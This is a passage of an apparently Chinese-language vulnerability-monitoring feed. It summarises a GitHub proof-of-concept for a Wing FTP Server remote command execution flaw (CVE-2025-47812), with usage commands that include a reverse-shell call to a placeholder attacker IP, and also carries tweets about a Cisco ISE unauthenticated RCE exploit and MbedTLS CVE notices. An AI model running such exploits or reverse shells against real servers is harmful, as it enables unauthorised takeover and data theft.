-    <link href="http://example.com/2025/07/04/github_1748189813/"/>
-    <id>http://example.com/2025/07/04/github_1748189813/</id>
-    <published>2025-07-04T16:45:23.000Z</published>
-    <updated>2025-07-04T16:45:23.435Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Wing FTP Server Remote Command Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-47812</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Wing FTP Server是一款广泛使用的FTP服务器软件，支持多种操作系统，常用于企业文件传输和共享服务。由于其易用性和功能丰富，被许多组织用于日常的文件管理任务。此次发现的远程命令执行（RCE）漏洞（CVE-2025-47812）允许攻击者通过认证过程中的<code>username</code>参数注入并执行任意Lua-based系统命令，从而实现完全的远程代码执行。</p><p>该漏洞的技术根源在于Wing FTP Server在处理用户认证请求时，未能对<code>username</code>参数进行充分的输入验证和过滤，导致攻击者可以构造恶意的用户名参数，注入并执行任意命令。这种类型的漏洞通常由于开发过程中对用户输入的处理不当，未能实施严格的安全措施所致。</p><p>利用此漏洞，攻击者可以在未授权的情况下远程执行任意命令，可能导致服务器被完全控制，敏感数据泄露，服务中断等严重后果。由于漏洞利用不需要复杂的交互，且可以通过自动化工具批量攻击，因此对使用受影响版本Wing FTP Server的用户构成了严重的安全威胁。建议所有用户立即检查并更新到最新版本，以避免潜在的安全风险。</p><p><strong>产品厂商：</strong> Wing FTP Server</p><p><strong>产品名称：</strong> Wing FTP Server</p><p><strong>来源：</strong> <a href="https://github.com/ill-deed/WingFTP-CVE-2025-47812-illdeed">https://github.com/ill-deed/WingFTP-CVE-2025-47812-illdeed</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-47812-Wing-FTP-Server-RCE-Exploit"><a href="#CVE-2025-47812-Wing-FTP-Server-RCE-Exploit" class="headerlink" title="CVE-2025-47812 - Wing FTP Server RCE Exploit"></a>CVE-2025-47812 - Wing FTP Server RCE Exploit</h2><p>This repository provides a proof-of-concept exploit for <strong>CVE-2025-47812</strong>, a remote command execution (RCE) vulnerability in <strong>Wing FTP Server</strong>. An attacker can inject and execute arbitrary Lua-based system commands by abusing the <code>username</code> parameter during authentication, resulting in full remote code execution.</p><hr><h3 id="📌-Exploit-Features"><a href="#📌-Exploit-Features" class="headerlink" title="📌 Exploit Features"></a>📌 Exploit Features</h3><ul><li>🔧 Remote execution of custom shell commands</li><li>🧬 Multiple built-in reverse shell payloads (bash, Python, netcat, etc.)</li><li>🪪 Automatic UID extraction from Set-Cookie</li><li>📦 Logs successful UIDs to <code>found_uids.txt</code></li><li>🧪 Dry-run mode (no actual requests sent — test your input&#x2F;output logic safely)</li><li>🔁 Retry logic on network failure</li><li>🧹 Cleaner payload formatting and readable output</li><li>✅ Input validation for IPs, ports, and URLs</li><li>⚙️ Command-line argument support for automated workflows</li></ul><hr><h3 id="💻-Usage"><a href="#💻-Usage" class="headerlink" title="💻 Usage"></a>💻 Usage</h3><p><strong>Execute a simple shell command:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exploit.py --url http://target:5466 --cmd <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure><p>Trigger a reverse shell:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python3 exploit.py <span class="hljs-params">--url</span> http:<span class="hljs-string">//target</span><span class="hljs-function">:5466</span> <span class="hljs-params">--reverse</span> <span class="hljs-params">--ip</span> YOUR_IP <span class="hljs-params">--port</span> 4444<br></code></pre></td></tr></table></figure><p>Dry-run mode (no requests will be sent):</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python3 exploit.py <span class="hljs-params">--url</span> http:<span class="hljs-string">//target</span><span class="hljs-function">:5466</span> <span class="hljs-params">--cmd</span> <span class="hljs-string">&quot;whoami&quot;</span> <span class="hljs-params">--dry-run</span><br></code></pre></td></tr></table></figure><h3 id="🔄-Changes-Made-to-the-Original-Exploit"><a href="#🔄-Changes-Made-to-the-Original-Exploit" class="headerlink" title="🔄 Changes Made to the Original Exploit"></a>🔄 Changes Made to the Original Exploit</h3><table><thead><tr><th>Feature&#x2F;Improvement</th><th>Description</th></tr></thead><tbody><tr><td>✅ <strong>Argument Parsing</strong></td><td>Added <code>argparse</code> CLI support for non-interactive mode</td></tr><tr><td>🔐 <strong>Input Validation</strong></td><td>Ensures valid URL&#x2F;IP&#x2F;port before attempting exploit</td></tr><tr><td>📦 <strong>Header Refactoring</strong></td><td>Extracted HTTP headers into a reusable function for consistency</td></tr><tr><td>📄 <strong>UID Logging</strong></td><td>Saves successful UID tokens to <code>found_uids.txt</code></td></tr><tr><td>🧪 <strong>Dry-Run Mode</strong></td><td>Allows safe testing without sending requests (<code>--dry-run</code>)</td></tr><tr><td>🕒 <strong>Timeout + Retries</strong></td><td>Adds request timeout and automatic retry attempts on failure</td></tr><tr><td>🧼 <strong>Payload Readability</strong></td><td>Reformatted the Lua injection string for clarity and maintenance</td></tr><tr><td>📊 <strong>Structured Output</strong></td><td>Wrapped server responses and payload info with delimiters for easy reading</td></tr><tr><td>⚠️ <strong>Status Code Checks</strong></td><td>Warns user if the target returns unexpected HTTP status codes</td></tr><tr><td>📝 <strong>Logging System</strong></td><td>Replaces <code>print()</code> with Python <code>logging</code> module for better verbosity control</td></tr></tbody></table><hr><h3 id="⚠️-Disclaimer"><a href="#⚠️-Disclaimer" class="headerlink" title="⚠️ Disclaimer"></a>⚠️ Disclaimer</h3><p>This project is intended for <strong>educational and authorized security testing only</strong>.<br>Do <strong>not</strong> use this tool against systems you do not own or have explicit permission to test.</p><hr><hr>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Wing FTP Server Remote Command Executio</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>illdeed Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_2539392828/"/>
-    <id>http://example.com/2025/07/04/twitter_2539392828/</id>
-    <published>2025-07-04T16:01:04.000Z</published>
-    <updated>2025-07-04T16:01:04.276Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> illdeed</p><p><strong>推文：</strong> 🚨 新漏洞验证：CVE-2025-20281 – Cisco ISE ERS 未授权远程代码执行<br>无需登录。完全root权限。直接发送即可。</p><p>🔥 通过<a href="https://t.co/kbYC85glbb%E8%BF%9B%E8%A1%8CBash%E6%B3%A8%E5%85%A5">https://t.co/kbYC85glbb进行Bash注入</a><br>💣 反向Shell或命令执行<br>🛠 Python利用代码在此 → <a href="https://t.co/EGbyOHZjrT">https://t.co/EGbyOHZjrT</a><br>#思科 #远程代码执行 #cve2025 #漏洞利用 #信息安全</p><p><strong>链接：</strong> <a href="https://x.com/illdeed/status/1941152342201729393">https://x.com/illdeed/status/1941152342201729393</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; illdeed&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 新漏洞验证：CVE-2025-20281 – Cisco ISE ERS 未授权远程代码执行&lt;br&gt;无需登录。完全root权限。直接发送即可。&lt;/p&gt;
-&lt;</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="illdeed" scheme="http://example.com/tags/illdeed/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVEnew Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_1788999112/"/>
-    <id>http://example.com/2025/07/04/twitter_1788999112/</id>
-    <published>2025-07-04T16:00:56.000Z</published>
-    <updated>2025-07-04T16:00:56.172Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> CVEnew</p><p><strong>推文：</strong> CVE-2025-49600 在MbedTLS 3.3.0至3.6.4之前的版本中，mbedtls_lms_verify可能在哈希计算失败且内部错误未被检查的情况下接受无效签名，从而启用LMS（Leighton-Mic… <a href="https://t.co/77Z21fepMX">https://t.co/77Z21fepMX</a></p><p><strong>链接：</strong> <a href="https://x.com/CVEnew/status/1941154060662366219">https://x.com/CVEnew/status/1941154060662366219</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CVEnew&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-49600 在MbedTLS 3.3.0至3.6.4之前的版本中，mbedtls_lms_verify可能在哈希计算失败且内部错误未被检查的情况</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="CVEnew" scheme="http://example.com/tags/CVEnew/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVEnew Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_986319198/"/>
-    <id>http://example.com/2025/07/04/twitter_986319198/</id>
-    <published>2025-07-04T16:00:49.000Z</published>
-    <updated>2025-07-04T16:00:49.264Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> CVEnew</p><p><strong>推文：</strong> CVE-2025-49601 在MbedTLS 3.3.0至3.6.4之前的版本中，mbedtls_lms_import_public_key函数在读取32位字段之前未检查输入缓冲区是否至少有4字节，可能导致… <a href="https://t.co/K5LsiqegLm">https://t.co/K5LsiqegLm</a></p><p><strong>链接：</strong> <a href="https://x.com/CVEnew/status/1941154061778047322">https://x.com/CVEnew/status/1941154061778047322</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CVEnew&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-49601 在MbedTLS 3.3.0至3.6.4之前的版本中，mbedtls_lms_import_public_key函数在读取32位字段</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="CVEnew" scheme="http://example.com/tags/CVEnew/"/>
     
   </entry>
   
